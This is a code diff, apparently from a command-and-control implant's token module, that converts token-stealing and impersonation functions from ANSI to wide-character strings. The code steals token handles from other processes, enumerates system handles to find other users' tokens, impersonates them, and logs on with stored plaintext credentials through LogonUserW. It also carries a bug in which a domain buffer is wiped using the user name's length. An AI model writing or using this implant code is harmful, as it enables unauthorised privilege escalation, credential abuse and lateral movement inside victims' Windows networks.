@@ -64,7 +64,7 @@ BOOL TokenSetPrivilege( LPSTR Privilege, BOOL Enable )
     return TRUE;
 }
 
-DWORD TokenAdd( HANDLE hToken, LPSTR DomainUser, SHORT Type, DWORD dwProcessID, LPSTR User, LPSTR Domain, LPSTR Password )
+DWORD TokenAdd( HANDLE hToken, LPWSTR DomainUser, SHORT Type, DWORD dwProcessID, LPWSTR User, LPWSTR Domain, LPWSTR Password )
 {
     PTOKEN_LIST_DATA TokenList   = NULL;
     PTOKEN_LIST_DATA TokenEntry  = NULL;
@@ -113,7 +113,7 @@ HANDLE TokenSteal( DWORD ProcessID, HANDLE TargetHandle )
     if ( TargetHandle )
     {
         PRINTF( "Stealing handle 0x%x from PID %d\n", TargetHandle, ProcessID );
-        ProcID.UniqueProcess = ProcessID;
+        ProcID.UniqueProcess = ( HANDLE ) ProcessID;
         NtStatus = Instance.Syscall.NtOpenProcess( &hProcess, PROCESS_DUP_HANDLE, &ObjAttr, &ProcID );
         if ( NT_SUCCESS( NtStatus ) )
         {
@@ -202,28 +202,28 @@ BOOL TokenRemove( DWORD TokenID )
 
         if ( Instance.Tokens.Vault->DomainUser )
         {
-            MemSet( Instance.Tokens.Vault->DomainUser, 0, StringLengthA( Instance.Tokens.Vault->DomainUser ) );
+            MemSet( Instance.Tokens.Vault->DomainUser, 0, StringLengthW( Instance.Tokens.Vault->DomainUser ) * sizeof( WCHAR ) );
             Instance.Win32.LocalFree( Instance.Tokens.Vault->DomainUser );
             Instance.Tokens.Vault->DomainUser = NULL;
         }
 
         if ( Instance.Tokens.Vault->lpUser )
         {
-            MemSet( Instance.Tokens.Vault->lpUser, 0, StringLengthA( Instance.Tokens.Vault->lpUser ) );
+            MemSet( Instance.Tokens.Vault->lpUser, 0, StringLengthW( Instance.Tokens.Vault->lpUser ) * sizeof( WCHAR ) );
             Instance.Win32.LocalFree( Instance.Tokens.Vault->lpUser );
             Instance.Tokens.Vault->lpUser = NULL;
         }
 
         if ( Instance.Tokens.Vault->lpDomain )
         {
-            MemSet( Instance.Tokens.Vault->lpDomain, 0, StringLengthA( Instance.Tokens.Vault->lpUser ) );
+            MemSet( Instance.Tokens.Vault->lpDomain, 0, StringLengthW( Instance.Tokens.Vault->lpUser ) * sizeof( WCHAR ) );
             Instance.Win32.LocalFree( Instance.Tokens.Vault->lpDomain );
             Instance.Tokens.Vault->lpDomain = NULL;
         }
 
         if ( Instance.Tokens.Vault->lpPassword )
         {
-            MemSet( Instance.Tokens.Vault->lpPassword, 0, StringLengthA( Instance.Tokens.Vault->lpPassword ) );
+            MemSet( Instance.Tokens.Vault->lpPassword, 0, StringLengthW( Instance.Tokens.Vault->lpPassword ) * sizeof( WCHAR ) );
             Instance.Win32.LocalFree( Instance.Tokens.Vault->lpPassword );
             Instance.Tokens.Vault->lpPassword = NULL;
         }
@@ -257,28 +257,28 @@ BOOL TokenRemove( DWORD TokenID )
 
                 if ( TokenItem->DomainUser )
                 {
-                    MemSet( TokenItem->DomainUser, 0, StringLengthA( TokenItem->DomainUser ) );
+                    MemSet( TokenItem->DomainUser, 0, StringLengthW( TokenItem->DomainUser ) * sizeof( WCHAR ) );
                     Instance.Win32.LocalFree( TokenItem->DomainUser );
                     TokenItem->DomainUser = NULL;
                 }
 
                 if ( TokenItem->lpUser )
                 {
-                    MemSet( TokenItem->lpUser, 0, StringLengthA( TokenItem->lpUser ) );
+                    MemSet( TokenItem->lpUser, 0, StringLengthW( TokenItem->lpUser ) * sizeof( WCHAR ) );
                     Instance.Win32.LocalFree( TokenItem->lpUser );
                     TokenItem->lpUser = NULL;
                 }
 
                 if ( TokenItem->lpDomain )
                 {
-                    MemSet( TokenItem->lpDomain, 0, StringLengthA( TokenItem->lpUser ) );
+                    MemSet( TokenItem->lpDomain, 0, StringLengthW( TokenItem->lpUser ) * sizeof( WCHAR ) );
                     Instance.Win32.LocalFree( TokenItem->lpDomain );
                     TokenItem->lpDomain = NULL;
                 }
 
                 if ( TokenItem->lpPassword )
                 {
-                    MemSet( TokenItem->lpPassword, 0, StringLengthA( TokenItem->lpPassword ) );
+                    MemSet( TokenItem->lpPassword, 0, StringLengthW( TokenItem->lpPassword ) * sizeof( WCHAR ) );
                     Instance.Win32.LocalFree( TokenItem->lpPassword );
                     TokenItem->lpPassword = NULL;
                 }
@@ -297,11 +297,11 @@ BOOL TokenRemove( DWORD TokenID )
     } while ( TRUE );
 }
 
-HANDLE TokenMake( LPSTR User, LPSTR Password, LPSTR Domain )
+HANDLE TokenMake( LPWSTR User, LPWSTR Password, LPWSTR Domain )
 {
     HANDLE hToken = NULL;
 
-    PRINTF( "TokenMake( %s, %s, %s )\n", User, Password, Domain )
+    PRINTF( "TokenMake( %ls, %ls, %ls )\n", User, Password, Domain )
 
     if ( ! Instance.Win32.RevertToSelf() )
     {
@@ -310,9 +310,9 @@ HANDLE TokenMake( LPSTR User, LPSTR Password, LPSTR Domain )
         // TODO: at this point should I return NULL or just continue ? For now i just continue.
     }
 
-    if ( ! Instance.Win32.LogonUserA( User, Domain, Password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken ) )
+    if ( ! Instance.Win32.LogonUserW( User, Domain, Password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken ) )
     {
-        PUTS( "LogonUserA: Failed" )
+        PUTS( "LogonUserW: Failed" )
         CALLBACK_GETLASTERROR
     }
 
@@ -398,6 +398,7 @@ BOOL TokenImpersonate( BOOL Impersonate )
         return TRUE; // we are already impersonating
     else if ( ! Impersonate && ! Instance.Tokens.Impersonate )
         return TRUE; // we are already not impersonating
+    return FALSE;
 }
 
 LPWSTR GetObjectInfo( HANDLE hObject, OBJECT_INFORMATION_CLASS objInfoClass )
@@ -679,8 +680,8 @@ BOOL ListTokens( PUniqueUserToken* pUniqTokens, PDWORD pNumTokens )
                                         if ( GetDomainUsernameFromToken( hObject, TokenList[ NumTokens ].username ) )
                                         {
                                             TokenList[ NumTokens ].token = hObject;
-                                            TokenList[ NumTokens ].dwProcessID = pProcessInfoEntry->UniqueProcessId;
-                                            TokenList[ NumTokens ].localHandle = (i + 1) * 4;
+                                            TokenList[ NumTokens ].dwProcessID = ( DWORD ) ( ULONG_PTR ) pProcessInfoEntry->UniqueProcessId;
+                                            TokenList[ NumTokens ].localHandle = ( HANDLE ) ( ( i + 1 ) * 4 );
                                             ProcessUserToken( &TokenList[ NumTokens ], UniqTokens, &NumUniqTokens );
                                             NumTokens++;
                                         }
@@ -733,7 +734,7 @@ BOOL ListTokens( PUniqueUserToken* pUniqTokens, PDWORD pNumTokens )
                                 if ( GetDomainUsernameFromToken( hObject, TokenList[ NumTokens ].username ) )
                                 {
                                     TokenList[ NumTokens ].token = hObject;
-                                    TokenList[ NumTokens ].dwProcessID = pProcessInfoEntry->UniqueProcessId;
+                                    TokenList[ NumTokens ].dwProcessID = ( DWORD ) ( ULONG_PTR ) pProcessInfoEntry->UniqueProcessId;
                                     TokenList[ NumTokens ].localHandle = 0;
                                     ProcessUserToken( &TokenList[ NumTokens ], UniqTokens, &NumUniqTokens );
                                     NumTokens++;
@@ -833,14 +834,14 @@ BOOL ImpersonateTokenInStore( PTOKEN_LIST_DATA TokenData )
         Instance.Tokens.Impersonate = TRUE;
         Instance.Tokens.Token       = TokenData;
 
-        PRINTF( "[+] Successfully impersonated: %s\n", TokenData->DomainUser );
+        PRINTF( "[+] Successfully impersonated: %ls\n", TokenData->DomainUser );
     }
     else
     {
         Instance.Tokens.Impersonate = FALSE;
         Instance.Tokens.Token       = NULL;
 
-        PRINTF( "[!] Failed to impersonate token user: %s\n", TokenData->DomainUser );
+        PRINTF( "[!] Failed to impersonate token user: %ls\n", TokenData->DomainUser );
 
         CALLBACK_GETLASTERROR
 
